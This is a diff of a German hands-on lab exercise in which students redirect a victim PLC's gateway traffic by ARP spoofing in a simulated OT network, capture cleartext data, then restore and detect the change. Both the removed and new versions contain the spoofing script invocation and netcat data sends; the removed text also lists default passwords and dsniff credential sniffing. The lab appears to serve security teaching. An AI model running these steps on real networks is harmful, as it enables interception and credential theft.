@@ -1,241 +1,163 @@
-# Übung 2: ARP-Spoofing-Angriff
+# Übung 2: Eine ARP-Umleitung nachweisen
 
-**Zeitschätzung**: 30-40 Minuten  
-**Lab-Topologie**: `ot-sec-flat` (empfohlen) oder `ot-sec-segmented`  
-**Schwierigkeit**: :material-signal-cellular-2: Fortgeschritten
+**Zeit:** 30–40 Minuten. **Lab:** aktuelles studentisches `ot-sec-flat`. **Niveau:** Fortgeschritten.
 
-## Lernziele
+Weise eine veränderte IP-MAC-Zuordnung nach, verfolge den umgeleiteten Verkehr und stelle den ursprünglichen Zustand wieder her. Verwende ausschliesslich die drei genannten Lab-Knoten. Die Adressen gehören zum simulierten Netz dieser Appliance.
 
-- Einen Layer-2-Man-in-the-Middle-Angriff ausführen
-- ARP-Protokoll-Schwachstellen verstehen
-- Klartext-Datenverkehr während eines MITM-Angriffs erfassen
-- Erkennungs- und Abwehrstrategien lernen
+**Lernziele:** ARPs Vertrauensproblem erklären, eine begrenzte Layer-2-Umleitung durchführen und nachweisen, lesbare Anwendungsdaten erkennen sowie Erkennung und Gegenmassnahmen erklären.
 
-## Voraussetzungen
+## Vorbereitung
 
-- Verständnis des ARP-Protokolls
-- Grundkenntnisse über Netzwerkangriffe
-- Wireshark-Erfahrung
-- Root/sudo-Konzepte
+Schliesse [Übung 1](ex1-vlan-discovery.md) ab. Öffne die konfigurierten Terminals; du brauchst weder Passwörter einzugeben noch Software zu installieren:
 
-## Szenario
+| Rolle | Terminal | Datenadresse |
+| --- | --- | --- |
+| Angreifer | [WAGO A](/network/terminal?node=wago-plc2a-vlan10) | `10.10.0.11` |
+| Opfer | [WAGO B](/network/terminal?node=wago-plc2b-vlan10) | `10.10.0.12` |
+| Empfänger | [DMZ-Jumphost](/network/terminal?node=proxmox-jumphost) | `2.2.2.2` |
 
-ARP (Address Resolution Protocol) ordnet IP-Adressen MAC-Adressen in lokalen Netzwerken zu. Da ARP keine Authentifizierung hat, kann ein Angreifer falsche ARP-Antworten senden, um den ARP-Cache von Zielgeräten zu vergiften. Dies leitet den Datenverkehr über das System des Angreifers um und ermöglicht Man-in-the-Middle-Angriffe. In OT-Umgebungen kann dies SPS-Kommunikation, Engineering-Workstation-Datenverkehr oder HMI-Verbindungen abfangen.
+Lass die Tabs offen. Die Terminals verwenden Management-Verbindungen; das Experiment läuft über Dateninterface `eth1`. Führe jeden Block auf dem genannten Knoten aus. Der Übungstitel im Werkzeug-Tab öffnet diese Anleitung erneut.
 
-## Aufgaben
+??? info "Du verwendest die eigenständige Dokumentation?"
+    Suche in **Netmap** deines zugewiesenen Live-Labs nach jedem stabilen Knotennamen aus der Tabelle. Wähle im Aktionsmenü **Open terminal**. Wähle für den Mitschnitt WAGO A, **Capture packets**, Interface **eth1**. Reader-Links treffen diese Auswahl automatisch und behalten Netzwerk und Snapshot bei.
 
-### Aufgabe 1: Normales ARP-Verhalten beobachten
+## Aufgabe 1: Die echte Gateway-Zuordnung festhalten
 
-1. SSH-Verbindung zur Opfer-SPS `wago-plc2b-vlan10`:
+Auf **WAGO B**:
 
 ```bash
-ssh admin@192.168.100.54
+ping -c 2 10.10.0.1
+ip neigh show 10.10.0.1 dev eth1
 ```
 
-!!! info "Standard-Anmeldedaten"
-    Passwort: `admin`
-
-2. Aktuelle ARP-Tabelle anzeigen:
+Notiere die Gateway-MAC, nicht nur den Nachbarzustand (`REACHABLE` oder `STALE`). Auf **WAGO A**:
 
 ```bash
-ip neighbor
+cat /sys/class/net/eth1/address
+cat /proc/sys/net/ipv4/ip_forward
+command -v arp_spoofing-simple.sh timeout
 ```
 
-3. Notieren Sie die MAC-Adresse für Gateway `10.10.0.1`
+Notiere A's MAC und den Forwarding-Wert. Das Hilfsprogramm bewahrt den vorherigen Forwarding-Zustand.
 
-4. Kontinuierlichen Ping zum externen Netzwerk starten:
+**Kontrollpunkt:** Gateway-MAC und A's MAC unterscheiden sich. Beide Befehle sind vorhanden. Ist die Zuordnung bereits verändert, führe zuerst Aufgabe 5 aus.
+
+## Aufgabe 2: Den normalen Weg beobachten
+
+[Öffne einen Mitschnitt an WAGO A's Datenport](/network/capture?node=wago-plc2a-vlan10&interface=eth1), wähle **Start Capture** und führe auf **WAGO B** aus:
 
 ```bash
-ping 1.1.1.1
+ping -c 3 2.2.2.2
 ```
 
-Lassen Sie dies laufen (drücken Sie nicht Ctrl+C).
+Verwende in Wireshark `icmp && ip.addr == 10.10.0.12`. Warte einige Sekunden, bis die Anzeige nachgezogen hat.
 
-### Aufgabe 2: Verkehrserfassung einrichten
+**Kontrollpunkt:** Die Pings antworten, ihre Unicast-Pakete durchqueren A's geswitchten Access-Link normalerweise aber nicht. ARP-Broadcasts können trotzdem sichtbar sein. Ist Opfer-Unicast bereits sichtbar, kontrolliere Zuordnung und Capture-Interface.
 
-1. Öffnen Sie ein neues Terminal bzw. eine neue SSH-Sitzung
-2. Stellen Sie eine SSH-Verbindung zur Angreifer-SPS `wago-plc2a-vlan10` her:
+## Aufgabe 3: Das ausgewählte Paar umleiten
+
+Starte auf **WAGO A** im Vordergrund:
 
 ```bash
-ssh admin@192.168.100.53
+timeout -s INT 60 arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
 ```
 
-3. Wireshark-Erfassung auf der Verbindung zwischen `wago-plc2a-vlan10` und `sw-acc1` starten
-4. Filter anwenden:
+Das Hilfsprogramm adressiert nur B und dessen Gateway und endet nach 60 Sekunden automatisch. Mit **Ctrl+C** kannst du früher stoppen. Lass dieses Terminal laufen, während du B verwendest.
 
-```wireshark
-icmp
-```
-
-**Beobachtung**: Derzeit sollten Sie noch KEINEN Datenverkehr sehen, da der Ping nicht über den Angreifer läuft.
-
-### Aufgabe 3: ARP-Spoofing-Angriff ausführen
-
-1. Auf dem Angreifer (`wago-plc2a-vlan10`) das ARP-Spoofing-Skript ausführen:
+Nach etwa fünf Sekunden auf **WAGO B**:
 
 ```bash
-sudo /home/admin/arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
+ip neigh show 10.10.0.1 dev eth1
+ping -c 3 2.2.2.2
 ```
 
-Parameter:
+**Kontrollpunkt:** B ordnet `10.10.0.1` jetzt A's MAC zu. Der Mitschnitt auf A enthält B's ICMP-Verkehr. Ein Paket kann beim Empfang und bei der Weiterleitung zweimal erscheinen. ICMP-Redirects und einzelne verlorene Pings sind möglich; sie widerlegen die MAC- und Nutzlastbelege nicht. Ping allein beweist keine Umleitung.
 
-- `eth1` - mit Netzwerk verbundenes Interface
-- `10.10.0.12` - Opfer-IP (wago-plc2b-vlan10)
-- `10.10.0.1` - Gateway-IP
+??? info "Hinweis: Timer abgelaufen oder keine Änderung"
+    Prüfe das Hilfsprogramm-Terminal auf Fehler. Ist es beendet, wiederhole den zeitlich begrenzten Befehl und anschliessend die Opfer-Befehle. Begrenze den Filter auf B und erweitere den Angriff nicht auf andere Knoten. Exit-Code 124 nach dem Timeout ist normal.
 
-**Erwartete Ausgabe**:
+## Aufgabe 4: Einen harmlosen Klartext-Marker finden
 
-```text
-[*] Enabling IP forwarding...
-[*] Poisoning 10.10.0.12 (telling it we are 10.10.0.1)...
-[*] Poisoning 10.10.0.1 (telling it we are 10.10.0.12)...
-```
-
-2. Überprüfen Sie Wireshark - Sie sollten jetzt ICMP-Echo-Anfragen und -Antworten sehen, die durch den Angreifer fliessen
-
-3. Beim Opfer ARP-Tabelle erneut überprüfen:
+Starte auf dem **DMZ-Jumphost**, während das Hilfsprogramm läuft:
 
 ```bash
-ip neighbor
+timeout 45 nc -l 2323
 ```
 
-**Frage**: Hat sich die MAC-Adresse für `10.10.0.1` geändert? Vergleichen Sie mit dem Original.
+Lass den Listener warten. Sende auf **WAGO B** einen Marker ohne echte Zugangsdaten:
 
-### Aufgabe 4: Klartext-Anmeldedaten erfassen
+```bash
+printf 'LAB-ARP-DEMO\n' | nc -N -w 3 2.2.2.2 2323
+```
 
-1. ARP-Spoofing-Skript stoppen (Ctrl+C auf Angreifer)
-2. Neues Terminal öffnen und SSH-Verbindung zum Internet-Knoten `panasonic-toughbook-internet` herstellen:
+Der Empfänger soll `LAB-ARP-DEMO` anzeigen. Filtere im Mitschnitt `tcp.port == 2323`, wähle ein Datenpaket und öffne per Rechtsklick **Follow → TCP Stream**. Finde denselben Marker und schliesse das Stream-Fenster wieder.
+
+**Kontrollpunkt:** Notiere eine Paketnummer mit dem Marker und die veränderte Nachbarzuordnung. Ein offener Port allein beweist keine abgefangenen Anwendungsdaten.
+
+??? info "Hinweis: Kein Marker"
+    Starte zuerst den Listener. Wiederhole Aufgabe 3, falls der Timer abgelaufen ist. `tcp.port == 2323 && tcp.len > 0` zeigt Datenpakete. Sind nur SYN-Pakete sichtbar, kontrolliere Listener und Route.
+
+## Aufgabe 5: Wiederherstellen und prüfen
+
+1. Stoppe das Hilfsprogramm auf A gegebenenfalls mit **Ctrl+C**. Warte auf den Prompt und einige Sekunden auf korrigierende ARP-Antworten. Stoppe auch den Listener mit **Ctrl+C**, falls er noch wartet.
+2. Aktualisiere auf **WAGO B** nur diesen dynamischen Gateway-Eintrag:
 
     ```bash
-    ssh admin@192.168.100.51
+    ip neigh del 10.10.0.1 dev eth1
+    ping -c 3 10.10.0.1
+    ip neigh show 10.10.0.1 dev eth1
     ```
 
-3. Auf dem Internet-Knoten netcat-Listener auf Port 2323 starten:
+    Meldet das Löschen einen fehlenden Eintrag, fahre mit Ping fort.
+3. Auf **WAGO A**:
 
     ```bash
-    nc -l -k 2323
+    pgrep -a arpspoof
+    cat /proc/sys/net/ipv4/ip_forward
     ```
 
-    Lassen Sie dies laufen, um eingehende Verbindungen zu empfangen.
+**Kontrollpunkt:** Kein `arpspoof`-Prozess bleibt übrig, Forwarding hat den Ausgangswert und B verwendet bei erfolgreichen Pings wieder die ursprüngliche Gateway-MAC. Ein stilles `pgrep` mit Exit-Code 1 bedeutet: kein Treffer. Bleibt die Zuordnung falsch, stoppe hier und hole die Kursleitung dazu.
 
-4. Beim Opfer (`wago-plc2b-vlan10`) Test-Anmeldedaten senden:
-
-    ```bash
-    echo "username:admin password:secretpass123" | nc 1.1.1.1 2323
-    ```
-
-5. Auf dem Angreifer ARP-Spoofing neu starten:
-
-    ```bash
-    sudo /home/admin/arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
-    ```
-
-6. Vom Opfer Anmeldedaten erneut senden:
-
-    ```bash
-    echo "username:admin password:secretpass123" | nc 1.1.1.1 2323
-    ```
-
-7. In Wireshark ICMP-Filter entfernen und nach TCP-Datenverkehr auf Port 2323 suchen
-8. TCP-Stream folgen, um Klartext-Daten zu sehen
-9. Netcat-Listener auf Internet-Knoten prüfen - er sollte die empfangenen Anmeldedaten anzeigen
-
-## Überprüfung
-
-Erfolgsindikatoren:
-
-- Angreifer sieht Ping-Datenverkehr des Opfers in Wireshark
-- ARP-Tabelle des Opfers zeigt MAC des Angreifers für Gateway
-- Skript-Ausgabe zeigt Poisoning-Meldungen
-- TCP-Stream enthüllt Klartext-Anmeldedaten
-
-## Zu überlegende Fragen
-
-1. Wie können Sie ARP-Spoofing in einem Produktionsnetzwerk erkennen?
-2. Welche Abwehrstrategien existieren (DAI, Port-Security, statisches ARP)?
-3. Warum ist dieser Angriff in OT-Umgebungen besonders gefährlich?
-4. Welche Protokolle sind anfällig für MITM-Anmeldedaten-Diebstahl?
-
-## Häufige Probleme
-
-- **Problem**: Skript schlägt fehl mit "must be run as root"
-  - **Lösung**: Verwenden Sie `sudo` vor dem Skript-Befehl
-
-- **Problem**: Kein Datenverkehr in Wireshark während des Angriffs sichtbar
-  - **Lösung**: Überprüfen Sie, ob IP-Forwarding aktiviert ist (Skript macht dies automatisch)
-
-## Erweiterte Herausforderung
-
-Verwenden Sie das `dsniff`-Tool zur automatischen Erfassung von Anmeldedaten:
-
-```bash
-sudo dsniff -i eth1
-```
-
-Während der Ausführung HTTP- oder FTP-Datenverkehr generieren und automatische Anmeldedaten-Extraktion beobachten.
-
----
+Lass den Mitschnitt für Extra 1 offen, falls du weitermachen möchtest. Schliesse sonst Capture- und Terminal-Tabs.
 
 ## Lösung
 
-??? success "Zum Anzeigen der Lösung klicken"
-    ### Zustand vor dem Angriff
+??? success "Vergleiche deine Belege"
+    Vorher sendet B gerouteten Verkehr an die echte Gateway-MAC. Gefälschte ARP-Antworten ersetzen diese Zuordnung durch A's MAC. B's geroutete Pakete laufen deshalb über A. Empfänger und Mitschnitt zeigen denselben Klartext-Marker. Nach dem Stoppen und Aktualisieren kehrt die ursprüngliche Zuordnung zurück.
 
-    ARP-Tabelle des Opfers vor dem Angriff:
+    Das belegt eine nicht authentifizierte ARP-Zuordnung und lesbare TCP-Anwendungsdaten im Lab. Es beweist keine Entschlüsselung verschlüsselter Inhalte. Port Security allein validiert keine IP-MAC-Zuordnung. Dynamic ARP Inspection benötigt vertrauenswürdige Bindings und einen Plan für statisch adressierte OT-Geräte.
 
-    ```bash
-    ip neighbor
-    ```
+## Extra 1: Eine ARP-Vorfall-Zeitleiste erstellen
 
-    Ausgabe zeigt:
+**Optional, 10 Minuten.** Verwende den offenen Mitschnitt oder wiederhole Aufgaben 2–5.
 
-    ```text
-    10.10.0.1 dev eth1 lladdr 02:42:ac:14:00:0b REACHABLE
-    ```
+1. Filtere `arp.opcode == 2 && arp.src.proto_ipv4 == 10.10.0.1`.
+2. Klappe **Address Resolution Protocol** auf. Notiere **Sender IP address**, **Sender MAC address** und je eine Frame-Nummer vor, während und nach dem Experiment. Fehlt eine Phase, kennzeichne sie als unbeobachtet; deine Nachbartabelle ist ein separater Beleg.
+3. Vergleiche die behauptete IP-Zuordnung mit A's bekannter MAC. Warum ist eine geänderte Zuordnung aussagekräftiger als die Zahl der ARP-Pakete?
 
-    Notieren Sie diese MAC-Adresse.
+**Kontrollpunkt:** Deine Zeitleiste unterscheidet echte Gateway-Zuordnung, gefälschte Behauptung und Wiederherstellung. Gratuitous ARP allein ist kein Angriffsbeweis. [Suche in den ARP-Feldern](https://www.wireshark.org/docs/dfref/a/arp.html) nach `arp.src.hw_mac` und `arp.isgratuitous`.
 
-    ### Angriffsdurchführung
+## Extra 2: Die Grenze dieser Umleitung finden
 
-    Vom Angreifer `wago-plc2a-vlan10`:
+**Optional, 10 Minuten.** Überlege zuerst: Erfasst eine falsche Gateway-Zuordnung jedes Ziel in `10.0.0.0/8`?
 
-    ```bash
-    sudo /home/admin/arp_spoofing-simple.sh eth1 10.10.0.12 10.10.0.1
-    ```
-
-    Ausgabe:
-
-    ```text
-    [*] Enabling IP forwarding...
-    [*] Poisoning 10.10.0.12 (telling it we are 10.10.0.1)...
-    [*] Poisoning 10.10.0.1 (telling it we are 10.10.0.12)...
-    ```
-
-    Skript läuft weiter.
-
-    ### Überprüfung
-
-    Beim Opfer ARP erneut prüfen:
+1. Starte einen neuen Mitschnitt an A's Datenport und wiederhole das zeitlich begrenzte Hilfsprogramm aus Aufgabe 3.
+2. Während es läuft, auf **WAGO B**:
 
     ```bash
-    ip neighbor
+    ip route get 10.20.0.11
+    ping -c 2 10.20.0.11
+    ping -c 2 2.2.2.2
     ```
 
-    MAC für `10.10.0.1` zeigt jetzt die MAC des Angreifers anstelle der echten Gateway-MAC.
+3. Vergleiche auf A `icmp.type == 8 && ip.src == 10.10.0.12 && ip.dst == 10.20.0.11` mit `icmp.type == 8 && ip.src == 10.10.0.12 && ip.dst == 2.2.2.2`.
 
-    In Wireshark auf dem Interface des Angreifers ist nun ICMP-Datenverkehr vom Opfer sichtbar.
+**Kontrollpunkt:** Die Route zu CtrlX `10.20.0.11` ist im flachen `/8` direkt über `eth1`. Die gefälschte Gateway-Zuordnung verändert diese direkte Nachbarzuordnung nicht; der geroutete Jumphost-Verkehr läuft hingegen über A. Beide Ziele können über unterschiedliche Ethernet-Wege erreichbar sein. Der Hostname `vlan20` erzeugt kein eigenes VLAN.
 
-    ### Erkennungsmethoden
+Wiederhole **Aufgabe 5 vollständig** und schliesse die Werkzeug-Tabs. Weiter mit [Übung 3](ex3-spanning-tree.md).
 
-    1. ARP-Tabellen auf unerwartete Änderungen überwachen
-    2. Gratuitous ARP-Pakete erkennen
-    3. ARP-Überwachungstools verwenden (arpwatch)
-    4. MAC-zu-IP-Zuordnungen mit bekanntem guten Zustand vergleichen
+## Weiterforschen
 
-    ### Abwehrstrategien
-
-    1. Dynamic ARP Inspection (DAI) auf Switches
-    2. Port-Security zur Begrenzung der MAC-Adressen pro Port
-    3. Statische ARP-Einträge für kritische Infrastruktur
-    4. Netzwerksegmentierung zur Reduzierung des Angriffsbereichs
-    5. 802.1X-Authentifizierung vor Netzwerkzugang
+- [ARP-Spezifikation, RFC 826](https://www.rfc-editor.org/rfc/rfc826.html): Suche das Aktualisieren der Zuordnung im Empfangsalgorithmus.
+- [arpspoof-Handbuch](https://manpages.debian.org/bullseye/dsniff/arpspoof.8.en.html): Vergleiche Forwarding und Zielauswahl.
+- [Cisco Dynamic ARP Inspection](https://www.cisco.com/c/en/us/support/docs/switches/lan-switch-software/222274-troubleshoot-dynamic-arp-inspection-dai.html): Welche Informationen benötigt der Switch zur Validierung?
